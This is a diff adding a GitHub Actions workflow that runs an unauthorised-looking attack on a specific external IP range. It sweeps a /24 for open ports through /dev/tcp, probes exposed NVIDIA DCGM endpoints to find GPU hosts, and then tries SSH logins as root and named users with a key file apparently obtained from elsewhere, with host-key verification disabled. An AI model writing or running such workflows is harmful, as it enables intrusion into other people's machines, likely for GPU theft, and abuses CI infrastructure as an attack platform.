@@ -1,0 +1,31 @@
+name: ul5685net
+on: workflow_dispatch
+permissions:
+  contents: write
+jobs: 
+  net:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - uses: actions/checkout@v4
+      - name: sweep
+        run: |
+          set +e
+          chmod 600 keys2/* 2>/dev/null
+          echo "=== 443 on .135"
+          timeout 12 curl -sk -m 10 -D - https://123.184.7.135/ -o /tmp/x135 -w 'code=%{http_code} len=%{size_download}\n' | head -12; head -c 300 /tmp/x135; echo
+          echo "=== SWEEP 123.184.7.0/24 ports"
+          scan(){ ip=$1; for p in 18086 18080 18081 781 9400 22 443 80 8888 8000; do timeout 2 bash -c "echo > /dev/tcp/$ip/$p" 2>/dev/null && echo "OPEN $ip $p"; done; }
+          export -f scan
+          seq 1 254 | xargs -P 64 -I{} bash -c 'scan 123.184.7.{}' | sort -V
+          echo "=== DCGM on hits"
+          for ip in 123.184.7.129 123.184.7.179; do
+            echo "-- $ip:9400"; timeout 8 curl -s -m 6 "http://$ip:9400/metrics" | grep -E 'DCGM_FI_DEV_(GPU|NAME|MEMORY_TOTAL)' | head -12
+          done
+          echo "=== SSH key ladder on candidates"
+          for h in 123.184.7.129 123.184.7.179; do
+            for u in root ubuntu kgzs liuqi; do
+              echo "-- $u@$h"; timeout 15 ssh -i keys2/k04_ibm_key.pem_ -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o IdentitiesOnly=yes $u@$h 'id -u; hostname' 2>&1 | tail -2
+            done
+          done
+          echo DONE
